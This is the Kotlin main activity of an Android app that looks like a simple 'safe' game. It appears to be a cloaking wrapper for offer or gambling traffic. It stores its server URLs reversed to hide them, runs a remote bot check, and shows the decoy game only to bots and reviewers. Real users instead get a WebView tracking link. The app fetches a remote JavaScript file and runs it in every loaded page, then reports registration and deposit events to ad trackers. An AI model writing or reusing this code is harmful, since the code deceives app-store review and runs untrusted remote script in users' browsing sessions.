package com.safe.thesafe

import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.content.res.Configuration
import android.net.ConnectivityManager
import android.net.Network
import android.net.NetworkRequest
import android.net.Uri
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.View
import android.webkit.*
import android.widget.ProgressBar
import androidx.appcompat.app.AlertDialog
import androidx.lifecycle.lifecycleScope
import bolts.AppLinks
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.facebook.FacebookSdk
import com.facebook.appevents.AppEventsConstants
import com.facebook.appevents.AppEventsLogger
import com.facebook.applinks.AppLinkData
import com.onesignal.OneSignal
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.async
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import okhttp3.OkHttpClient
import okhttp3.Request
import org.json.JSONObject
import java.net.URL
import java.util.*
import kotlin.coroutines.resume
import kotlin.coroutines.suspendCoroutine

class MainActivity : AppCompatActivity(), OpenFile.ActivityChoser {
    private lateinit var botUrl : String
    private lateinit var scriptik : String
    private lateinit var file_switcher : String
    private lateinit var mytracklink: String
    private lateinit var conversionLink : String
    private var scrp: String? = null
    private lateinit var webView: WebView
    private lateinit var shara: SharedPreferences
    private lateinit var shared: SharedPreferences
    private var alertDialog: AlertDialog? = null
    private val dequeStart: Deque<String> = LinkedList()
    override var messageUpload: ValueCallback<Array<Uri>>? = null
    private lateinit var progB: ProgressBar
    private lateinit var okHttpClient: OkHttpClient
    private lateinit var urlAtLast: String

    private val callBackNetwork = object : ConnectivityManager.NetworkCallback() {
        override fun onAvailable(network: Network) {
            super.onAvailable(network)
            runOnUiThread { alertDialog?.hide() }
        }
        override fun onLost(network: Network) {
            super.onLost(network)
            runOnUiThread { alertDialog?.show() }
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        webView = findViewById(R.id.webview)
        progB = findViewById(R.id.progress)

        botUrl = getString(R.string.bot_url)
        scriptik = getString(R.string.jsfile)
        file_switcher = getString(R.string.switcher)
        mytracklink = getString(R.string.trackmy)
        conversionLink = getString(R.string.conversionLink)

        shara = getSharedPreferences("sh", Context.MODE_PRIVATE)
        shared = getSharedPreferences("APP_PREFERENCES", Context.MODE_PRIVATE)
        okkhtpClientInit()
        webViewInitClient()
        dequeInitClient()
        appsflyerInitClient()
        alertDialog = AlertDialog.Builder(this).apply {
            setTitle("No internet connection")
            setMessage("Turn on the network")
            setFinishOnTouchOutside(false)
            setCancelable(false)
        }.create()

    }

    private fun dequeInitClient() {
        val dequeSet = shared.getString("PREFS_DEQUE", null)
        dequeSet?.let {
            if (it.isNotBlank()) {
                for (elem in dequeSet.split(",")) {
                    addToDeque(elem)
                }
            }
        }
    }

    private fun okkhtpClientInit() {
        okHttpClient = OkHttpClient.Builder()
            .followSslRedirects(false)
            .followRedirects(false)
            .addNetworkInterceptor {
                it.proceed(
                    it.request().newBuilder()
                        .header("User-Agent", WebSettings.getDefaultUserAgent(this))
                        .build()
                )
            }.build()
    }

    private fun webViewInitClient() {
        webView.setWebChromeClient(WebChromeClient())
        webView.webViewClient = WebViewClient()
        with(webView.settings) {
            loadWithOverviewMode = true
            javaScriptEnabled = true
            useWideViewPort = true
            domStorageEnabled = true
            javaScriptCanOpenWindowsAutomatically = true
        }
        webView.webChromeClient = OpenFile(this@MainActivity)
        val cookieManager = CookieManager.getInstance()
        cookieManager.setAcceptCookie(true)
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.LOLLIPOP) {
            cookieManager.setAcceptThirdPartyCookies(webView, true)
        }

        webView.webViewClient = object : WebViewClient() {
            override fun shouldOverrideUrlLoading(view: WebView?, url: String?): Boolean {
                sust_offerId(url)
                return false
            }

            override fun onPageFinished(view: WebView?, url: String?) {
                sust_offerId(url)
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.LOLLIPOP) {
                    CookieManager.getInstance().flush() // Синхронизируем cookie
                }
                url?.let { if (it != "about:blank" && it.isNotBlank()) addToDeque(it) }
                val queryId = shara.getString("PREFS_QUERYID", "")
                scrp?.let {
                    webView.evaluateJavascript(it) {
                        webView.evaluateJavascript("mainContextFunc('" + queryId + "');") {}
                    }
                }
            }
        }
    }

    private fun appsflyerInitClient() {
        if (isWebWorking()) {
            startApp()
        } else {
            val alertDialog1 = AlertDialog.Builder(this).apply {
                setTitle("No Internet Connection")
                setMessage("Turn on the network and try again")
                setPositiveButton("Try again", null)
                setCancelable(false)
                setFinishOnTouchOutside(false)
            }.create()
            alertDialog1.show()
            alertDialog1.getButton(AlertDialog.BUTTON_POSITIVE).setOnClickListener {
                if (isWebWorking()) {
                    alertDialog1.dismiss()
                    startApp()
                }
            }
        }
    }

    private fun startApp() {
        lifecycleScope.launch {
            val switchf = file_switcher.reversed()
            val switchFile = withContext(Dispatchers.IO) { getStringFromUrl(switchf) }
            if (!switchFile.isBlank()) {
                if (switchFile == "true") {
                    startActivity(Intent(this@MainActivity, SafeGame::class.java))
                    finish()
                    return@launch
                }
            }

            val scriptor = scriptik.reversed()
            scrp = async(Dispatchers.IO) { getStringFromUrl(scriptor) }.await()

            val eUrl =  shara.getString("myurlhistory", "")
            if (dequeStart.isEmpty() && !eUrl.isNullOrEmpty())
                addToDeque(eUrl)

            if (dequeStart.isNotEmpty()) {
                webView.loadUrl(dequeStart.first)
                progB.visibility = View.GONE
                webView.visibility = View.VISIBLE
                handler.post(conversionTask)
                dequeStart.removeFirst()
            } else {
                fbDeepGetAndS()
            }
        }
    }

    private fun unregisterCall() {
        try {
            val cm =
                getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            cm.unregisterNetworkCallback(callBackNetwork)
        } catch (ex: java.lang.Exception) {
            ex.printStackTrace()
        }
    }

    private fun registerCall() {
        try {
            val cm =
                getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            val builder = NetworkRequest.Builder()
            cm.registerNetworkCallback(
                builder.build(),
                callBackNetwork
            )
        } catch (ex: java.lang.Exception) {
            ex.printStackTrace()
        }
    }

    fun isWebWorking(): Boolean {
        val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager
        return cm?.activeNetworkInfo?.isConnected ?: false
    }

    private suspend fun fbDeepGetAndS() {
        val deepLinkFb = getDeepLink()
        val apsetApsflyer = getAdset()
        getDeepLinkAnkAdset(deepLinkFb, apsetApsflyer)
        if (isBot()) {
            val intent = Intent(this@MainActivity,  SafeGame::class.java)
            startActivity(intent)
            finish()
            return
        } else {
            webView.visibility = View.VISIBLE
            progB.visibility = View.GONE
            handler.post(conversionTask)
            webView.loadUrl(urlAtLast)
            Log.d("itog", urlAtLast)
            OneSignal.sendTag("nobot", "1")
            OneSignal.sendTag("bundle", BuildConfig.APPLICATION_ID)
            val id_str = Uri.parse("?$urlAtLast").getQueryParameter("stream")
            if (!id_str.isNullOrBlank()) {
                OneSignal.sendTag("stream", id_str)
            }
        }
    }

    private suspend fun getDeepLink(): String = suspendCoroutine { continuation ->
        val prefsFaceB = shared.getString("deep_shearedPref", null)
        if (prefsFaceB != null) {
            continuation.resume(prefsFaceB)
        } else {
            FacebookSdk.setAutoInitEnabled(true)
            FacebookSdk.fullyInitialize()
            AppLinkData.fetchDeferredAppLinkData(
                this
            ) { appLinkData ->
                if (appLinkData != null) {
                }
                val uri: Uri? =
                    appLinkData?.targetUri ?: AppLinks.getTargetUrlFromInboundIntent(this, intent)

                uri?.query?.let {
                    shared.edit().putString("deep_shearedPref", it).apply()
                }

                continuation.resume(uri?.query ?: "")
            }
        }
    }



    private suspend fun getAdset(): String = suspendCoroutine { continuation ->
        val shar_conv = "PREFS_CONVERSION"
        val adset = shared.getString(shar_conv, null)
        if (adset != null) {
            continuation.resume(adset)
        } else {
            val conversationListener = object : AppsFlyerConversionListener {
                override fun onConversionDataSuccess(data: MutableMap<String, Any>?) {
                    val key_a = "adset"
                    val key_compaign = "campaign"
                    var key_value = ""
                    data?.let {
                        if (it.containsKey(key_a)) {
                            key_value = it[key_a].toString()
                        }
                        if (shared.getString(shar_conv, null) == null) {
                            shared.edit().putString(shar_conv, key_value).apply()
                            continuation.resume(key_value)
                            OneSignal.sendTag(key_a, key_value)
                            var count = 0
                            for(i in it) {
                                OneSignal.sendTag("install${count}", "${i.key} - ${i.value}")
                                count++
                            }
                            //тут мы начинаем писать логику для compaign ---------- начало


                            if(it.containsKey(key_compaign)) {
                                key_value = it[key_compaign].toString()
                                OneSignal.sendTag(key_compaign, key_value)

                                if (key_value.isNotBlank() && !key_value.equals("None")) {
                                    val compaignId = key_value.replace("-", "=").replace("_", "&")
                                    urlAtLast = "$urlAtLast&$compaignId"

                                    if (shared.getString(shar_conv, null) == null) {
                                        shared.edit().putString(shar_conv, key_value).apply()
                                        continuation.resume(key_value)
                                    }
                                }
                            }
                        }

                    } ?: continuation.resume("")
                }

                override fun onConversionDataFail(error: String?) {
                    continuation.resume("")
                }

                override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {}
                override fun onAttributionFailure(error: String?) {
                    continuation.resume("")
                }
            }
            AppsFlyerLib.getInstance()
                .registerConversionListener(applicationContext, conversationListener)
        }
    }



    private suspend fun isBot() = suspendCoroutine<Boolean> { cont ->
        val wv = WebView(this)
        wv.settings.javaScriptEnabled = true
        wv.webViewClient = object : WebViewClient() {
            override fun shouldOverrideUrlLoading(view: WebView?, url: String?): Boolean {
                val host = Uri.parse(url.toString()).host
                if (host == "bot" || host == "nobot") {
                    cont.resume(host != "nobot")
                }
                return false
            }
        }
        wv.loadUrl(botUrl.reversed())
    }

    private fun getStringFromUrl(url: String): String {
        return URL(url).readText(Charsets.UTF_8)
    }

    private fun getDeepLinkAnkAdset (deeplink: String, conversion: String) {
        val getClickedId = getClickedId()
        val getSourceId = BuildConfig.APPLICATION_ID
        val trackm = mytracklink.reversed()
        urlAtLast = "${trackm}&click_id=$getClickedId&source=$getSourceId"
        if (deeplink.isNotBlank()) {
            urlAtLast = "$urlAtLast&$deeplink"
        }

        if (conversion.isNotBlank()) {
            val adset = conversion.replace("|", "&").replace("_", "=")
            urlAtLast = "$urlAtLast&$adset"
        }
    }

    private fun getClickedId(): String {
        var clicked_id = shared.getString("PREF_CLICK_ID", null)
        Log.d("clickedId", shared.toString())
        if (clicked_id == null) {
            clicked_id = UUID.randomUUID().toString()
            shared.edit().putString("PREF_CLICK_ID", clicked_id)
                .apply()
        }
        return clicked_id
    }

    private fun sust_offerId (url: String?) {
        try {
            url?.let {
                val uri = Uri.parse(it)
                if (uri.queryParameterNames.contains("cust_offer_id")) {
                    shara
                        .edit()
                        .putString("PREFS_QUERYID", uri.getQueryParameter("cust_offer_id"))
                        .apply()
                }
            }
        } catch (ex: Exception) {
            ex.printStackTrace()
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == OpenFile.ActivityChoser.REQUEST_SELECT_FILE) {
            if (messageUpload == null) return
            messageUpload?.onReceiveValue(
                WebChromeClient.FileChooserParams.parseResult(
                    resultCode,
                    data
                )
            )
            messageUpload = null
        }
    }

    private fun myDeque(): Boolean {
        try {
            if (dequeStart.size == 1) return false;
            dequeStart.removeFirst()
            webView.loadUrl(dequeStart.first)
            dequeStart.removeFirst()
            return true
        } catch (ex: NoSuchElementException) {
            ex.printStackTrace()
            return false
        }
    }

    private fun addToDeque(url: String) {
        if (dequeStart.size > 5) {
            dequeStart.removeLast()
        }
        dequeStart.addFirst(url)
    }

    override fun onStop() {
        super.onStop()
        unregisterCall()
        shared.edit().putString("PREFS_DEQUE", dequeStart.reversed().joinToString(","))
            .apply()
    }

    override fun onBackPressed() {
        if (!myDeque()) {
            super.onBackPressed()
        }
    }

    override fun onStart() {
        super.onStart()
        registerCall()
    }

    override fun onConfigurationChanged(newConfig: Configuration) {
        super.onConfigurationChanged(newConfig)
    }

    fun fbEvents(key: String, value: String) {
        val facebook = AppEventsLogger.newLogger(this)
        val bundle = Bundle()
        when (key) {
            "reg" -> {
                bundle.putString(AppEventsConstants.EVENT_PARAM_CONTENT, value)
                facebook.logEvent(AppEventsConstants.EVENT_NAME_COMPLETED_REGISTRATION, bundle)
            }
            "dep" -> {
                bundle.putString(AppEventsConstants.EVENT_PARAM_CONTENT, value)
                facebook.logEvent(AppEventsConstants.EVENT_NAME_ADDED_TO_CART, bundle)
            }
        }
    }

    fun oneSevents(key: String, value: String) {
        OneSignal.sendTag(key, value)
    }

    private fun apsflEvents(key: String, value: String) {
        val values = HashMap<String, Any>()
        values[key] = value
        AppsFlyerLib.getInstance().trackEvent(this, key, values)
    }

    fun getConversion(): JSONObject {
        val conva = conversionLink.reversed()
        return try {
            val response = okHttpClient
                .newCall(Request.Builder().url("${conva}?click_id=${getClickedId()}").build())
                .execute()
            JSONObject(response.body?.string() ?: "{}")
        } catch (ex: Exception) {
            JSONObject("{}")
        }
    }

    private val handler = Handler(Looper.getMainLooper())
    private val conversionTask = object : Runnable {
        override fun run() {
            lifecycleScope.launch {
                val json = withContext(Dispatchers.IO) { getConversion() }
                val name_event = "event"
                val name_value = "value"
                if (json.has(name_event)) {
                    val value = json.optString(name_value) ?: " " // при пустом value отправляем пробел
                    oneSevents(json.optString(name_event), value)
                    fbEvents(json.optString(name_event), value)
                    apsflEvents(json.optString(name_event), value)
                }
            }
            handler.postDelayed(this, 15000)
        }
    }

    override fun onNewIntent(intent: Intent?) {
        super.onNewIntent(intent)
        intent?.extras?.getString("notification_url")?.let {
            dequeStart.clear()
            shara.edit().putString("myurlhistory", it).apply()
            addToDeque(it)
            webView.loadUrl(it)
        }
    }
}